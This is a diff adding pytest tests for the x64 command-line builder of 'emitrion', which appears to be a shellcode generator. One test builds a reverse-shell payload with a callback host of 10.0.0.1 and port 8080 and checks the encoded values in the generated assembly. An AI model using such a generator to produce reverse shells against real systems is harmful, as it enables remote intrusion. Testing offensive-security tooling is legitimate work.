@@ -228,3 +228,42 @@ class TestBuildX64Integration:
             config=config, assemble=False,
         )
         assert result.asm
+
+
+class TestCLIx64:
+    def test_cli_no_assemble_produces_outputs(self, tmp_path, monkeypatch) -> None:
+        from emitrion.build_x64 import main_x64
+        out = str(tmp_path / "out")
+        monkeypatch.setattr(
+            "sys.argv",
+            ["emitrion-x64", str(MANIFEST_DIR / "run_command_x64.yaml"),
+             "--no-assemble", "--out", out],
+        )
+        main_x64()
+        assert (tmp_path / "out" / "asm" / "generated.asm").exists()
+        assert (tmp_path / "out" / "asm" / "debug_runner.py").exists()
+        assert (tmp_path / "out" / "Documentation" / "contract.md").exists()
+
+    def test_cli_lhost_lport_override(self, tmp_path, monkeypatch) -> None:
+        from emitrion.build_x64 import main_x64
+        import socket as _socket, struct as _struct
+        out = str(tmp_path / "out")
+        monkeypatch.setattr(
+            "sys.argv",
+            ["emitrion-x64", str(MANIFEST_DIR / "revshell_x64.yaml"),
+             "--lhost", "10.0.0.1", "--lport", "8080",
+             "--no-assemble", "--out", out],
+        )
+        main_x64()
+        asm = (tmp_path / "out" / "asm" / "generated.asm").read_text()
+        ip_le = _struct.unpack("<I", _socket.inet_aton("10.0.0.1"))[0]
+        port_be = _socket.htons(8080)
+        assert f"0x{ip_le:x}" in asm
+        assert f"0x{port_be:x}" in asm
+
+    def test_cli_help_exits_zero(self, monkeypatch) -> None:
+        from emitrion.build_x64 import main_x64
+        monkeypatch.setattr("sys.argv", ["emitrion-x64", "--help"])
+        with pytest.raises(SystemExit) as exc_info:
+            main_x64()
+        assert exc_info.value.code == 0
